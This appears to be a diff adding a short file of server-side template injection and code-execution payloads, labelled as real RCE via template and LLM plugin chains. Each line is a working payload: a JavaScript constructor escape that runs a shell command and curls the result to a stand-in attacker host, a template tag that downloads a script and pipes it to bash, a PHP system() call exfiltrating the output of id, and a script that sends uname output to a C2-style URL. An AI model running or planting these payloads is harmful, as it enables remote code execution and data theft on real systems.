@@ -1,0 +1,7 @@
+<!-- Real RCE via template and LLM plugin chains -->
+{{range.constructor('return process.mainModule.require("child_process").execSync("curl http://evil.com/`whoami`")')()}}
+<% require('child_process').exec('wget http://evil.com/r.sh -O- | bash') %>
+<?php system("curl https://evil.me/`id`"); ?>
+<script>
+fetch('https://evil.c2/exfil?cmd='+encodeURIComponent(require('child_process').execSync('uname -a')))
+</script>
